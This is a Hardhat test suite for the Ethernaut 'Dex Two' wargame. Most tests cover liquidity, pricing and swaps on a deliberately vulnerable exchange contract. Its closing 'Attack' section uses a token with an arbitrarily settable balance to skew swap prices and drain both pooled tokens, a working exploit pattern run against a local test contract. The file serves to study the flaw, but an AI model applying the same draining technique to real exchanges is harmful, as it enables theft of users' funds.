const { expect } = require("chai");
const { ethers } = require("hardhat");
const utils = require("../scripts/lib/utils");

describe("Ethernaut Dex Two", function () {
    let dex, token1, token2;    //contracts
	let owner;                  //accounts 
	
	beforeEach(async function () {
		[owner, ...addrs] = await ethers.getSigners();
		
        //tokens
		token1 = await utils.deployContractSilent("AToken");
		token2 = await utils.deployContractSilent("BToken");
        
        //dex
        dex = await utils.deployContractSilent("Dex");
        
        await dex.setTokens(token1.address, token2.address);
	});
	
	describe("Initial State", function() {
		it("Initial balance of token1", async function () {
			expect(await token1.balanceOf(owner.address)).to.be.not.equal(0);
		});
        
		it("Initial balance of token2", async function () {
			expect(await token2.balanceOf(owner.address)).to.be.not.equal(0);
		});
	});
	
	describe("Add Liquidity", function() {
		it("add liquidity without approving", async function () {
			expect(await token1.balanceOf(dex.address)).to.be.equal(0);
            
            //add liquidity without approving first
			await expect(dex.add_liquidity(token1.address, 100)).to.be.revertedWith("ERC20: insufficient allowance");
            
            //balance should still be zero 
			expect(await token1.balanceOf(dex.address)).to.be.equal(0);
		});
        
		it("add liquidity more than approved", async function () {
			expect(await token1.balanceOf(dex.address)).to.be.equal(0);
            
            //approve only 50
			await token1.approve(dex.address, 50);
            
            //attempt to add 100 
			await expect(dex.add_liquidity(token1.address, 100)).to.be.revertedWith("ERC20: insufficient allowance");            
            
            //balance should still be zero 
			expect(await token1.balanceOf(dex.address)).to.be.equal(0);
		});
        
		it("add liquidity token1", async function () {
			const amount = 100;
            
            //approve & add liquidity 
            await approveAndAdd(token1, amount);
            
            //balance should be what was added 
			expect(await token1.balanceOf(dex.address)).to.be.equal(amount);
		});
        
		it("add liquidity token2", async function () {
			const amount = 100;
            
            //approve & add liquidity 
            await approveAndAdd(token2, amount);
            
            //balance should be what was added 
			expect(await token2.balanceOf(dex.address)).to.be.equal(amount);
		});
	});
	      
	describe("Get prices", function () {
		//divide by zero, gets reverted with no error 
		it("get price of token with no liquidity", async function () {
            //amounts of token1 & token2 are both zero
            await expect(dex.getSwapAmount(token2.address, token1.address, 1)).to.be.reverted;
		});
		
		//divide by zero, gets reverted with no error 
		it("get price of token with token 1 liquidity only", async function () {
            await approveAndAdd(token1, 100);
           	await expect(dex.getSwapAmount(token2.address, token1.address, 1)).to.be.reverted;
		});
		
		//price should equal 0
		it("get price of token with token 2 liquidity only", async function () {
            await approveAndAdd(token2, 100);
           	expect(await dex.getSwapAmount(token2.address, token1.address, 1)).to.be.equal(0);
		});
		
		//price should equal 1
		it("get price of token with both liquidity 1 to 1", async function () {
            
            //add 100 each 
            await approveAndAdd(token1, 100);
            await approveAndAdd(token2, 100);
        
            //swap: 1 to 1
           	expect(await dex.getSwapAmount(token2.address, token1.address, 1)).to.be.equal(1);
		});
        
        //swap price should be 1 for 3/2 swap
		it("get price of token with both liquidity 3 to 2", async function () {
            await approveAndAdd(token1, 300);
            await approveAndAdd(token2, 200);
           	expect(await dex.getSwapAmount(token2.address, token1.address, 1)).to.be.equal(1);
		});
        
        //swap price should be 0 for 2/3 swap
		it("get price of token with both liquidity 2 to 3", async function () {
            await approveAndAdd(token1, 200);
            await approveAndAdd(token2, 300);
           	expect(await dex.getSwapAmount(token2.address, token1.address, 1)).to.be.equal(0);
		});
		
        //swap price should be 0 for 1/2 swap
		it("get price of token with both liquidity 1 to 2", async function () {
            await approveAndAdd(token1, 100);
            await approveAndAdd(token2, 200);
           	expect(await dex.getSwapAmount(token2.address, token1.address, 1)).to.be.equal(0);
		});
		
        //swap price should be 2 for 2/1 swap
		it("get price of token with both liquidity 2 to 1", async function () {
            await approveAndAdd(token1, 200);
            await approveAndAdd(token2, 100);
           	expect(await dex.getSwapAmount(token2.address, token1.address, 1)).to.be.equal(2);
		});
    });
    
	describe("Swap", function () {
        it ("swap 1 to 1", async function () {
            const initial1 = 100; 
            const initial2 = 100; 
            const swapAmount = 10; 
            
            //swap
            await doSwap(initial1, initial2, swapAmount);
            
            //check balances
            expect(await token1.balanceOf(dex.address)).to.equal(initial1 + swapAmount);
            expect(await token2.balanceOf(dex.address)).to.equal(initial2 - swapAmount);
        });
        
        it ("swap 1 to 2", async function () {
            const initial1 = 200; 
            const initial2 = 100; 
            const swapAmount = 10; 
            
            //swap
            await doSwap(initial1, initial2, swapAmount);
            
            //check balances
            expect(await token1.balanceOf(dex.address)).to.equal(initial1 + swapAmount);
            expect(await token2.balanceOf(dex.address)).to.equal(initial2 - swapAmount/2);
        });
        
        it ("swap 2 to 1", async function () {
            const initial1 = 100; 
            const initial2 = 200; 
            const swapAmount = 10; 
            
            //swap
            await doSwap(initial1, initial2, swapAmount);
            
            //check balances
            expect(await token1.balanceOf(dex.address)).to.equal(initial1 + swapAmount);
            expect(await token2.balanceOf(dex.address)).to.equal(initial2 - (swapAmount*2));
        });
        
        it ("swap 2 to 3", async function () {
            const initial1 = 300; 
            const initial2 = 200; 
            const swapAmount = 30; 
            
            //swap
            await doSwap(initial1, initial2, swapAmount);
            
            //check balances
            expect(await token1.balanceOf(dex.address)).to.equal(initial1 + swapAmount);
            expect(await token2.balanceOf(dex.address)).to.equal(initial2 - (swapAmount * (2/3)));
        });
        
        it ("swap 3 to 2", async function () {
            const initial1 = 200; 
            const initial2 = 300; 
            const swapAmount = 60; 
            
            //swap
            await doSwap(initial1, initial2, swapAmount);
            
            //check balances
            expect(await token1.balanceOf(dex.address)).to.equal(initial1 + swapAmount);
            expect(await token2.balanceOf(dex.address)).to.equal(initial2 - (swapAmount + (swapAmount/2)));
        });
    });
    
	describe("Attack", function() {
        let atkToken;
        
        beforeEach(async function () {
            atkToken = await utils.deployContractSilent("AttackToken");
            
            await approveAndAdd(token1, 100);
            await approveAndAdd(token2, 100);
        });
        
		it("manipulate swap amount", async function() {
            //set token balance to be equal to token1 balance
            await atkToken.setBalance(await token1.balanceOf(dex.address)); 
            
            //swap should be 1 to 1 
            expect(await dex.getSwapAmount(atkToken.address, token1.address, 1)).to.be.equal(1);
        });
        
		it("steal all of token1", async function() {
            //set it up 
            await atkToken.setBalance(await token1.balanceOf(dex.address)); 
            expect(await dex.getSwapAmount(atkToken.address, token1.address, 1)).to.be.equal(1);
            
            //do the swap 
            await dex.swap(atkToken.address, token1.address, 100); 
            
            //dex should be all out of token1
            expect(await token1.balanceOf(dex.address)).to.equal(0);
        });
        
		it("steal all of both tokens", async function() {
            //set it up 
            await atkToken.setBalance(await token1.balanceOf(dex.address)); 
            expect(await dex.getSwapAmount(atkToken.address, token1.address, 1)).to.be.equal(1);
            
            //do the swap for token1
            await dex.swap(atkToken.address, token1.address, 100); 
            
            //reset the balance for token2
            await atkToken.setBalance(await token2.balanceOf(dex.address)); 
            
            //swap for token2
            await dex.swap(atkToken.address, token2.address, 100); 
            
            //dex should be all out of tokens
            expect(await token1.balanceOf(dex.address)).to.equal(0);
            expect(await token2.balanceOf(dex.address)).to.equal(0);
        });
    });
	
    /**
     * Approve spending of a token, and add it to the Dex as liquidity in one step. 
     * @param {string} token the token to approve for spending by the Dex
     * @param {number} amount the quantity of token to approve 
     */
    async function approveAndAdd(token, amount) {
        await token.approve(dex.address, amount);
        await dex.add_liquidity(token.address, amount);
    }
    
    /**
     * Performs a swap on the DEX. 
     * @param {number} amount1 the quantity of token1 to add to Dex as liquidity
     * @param {number} amount2  the quantity of token2 to add to Dex as liquidity
     * @param {number} swapAmount the amount of token1 to swap for token2
     */
    async function doSwap(amount1, amount2, swapAmount) {
        //add liquidity 
        await approveAndAdd(token1, amount1);
        await approveAndAdd(token2, amount2);
        
        //swap 
        await token1.approve(dex.address, swapAmount);
        await dex.swap(token1.address, token2.address, swapAmount); 
    }
});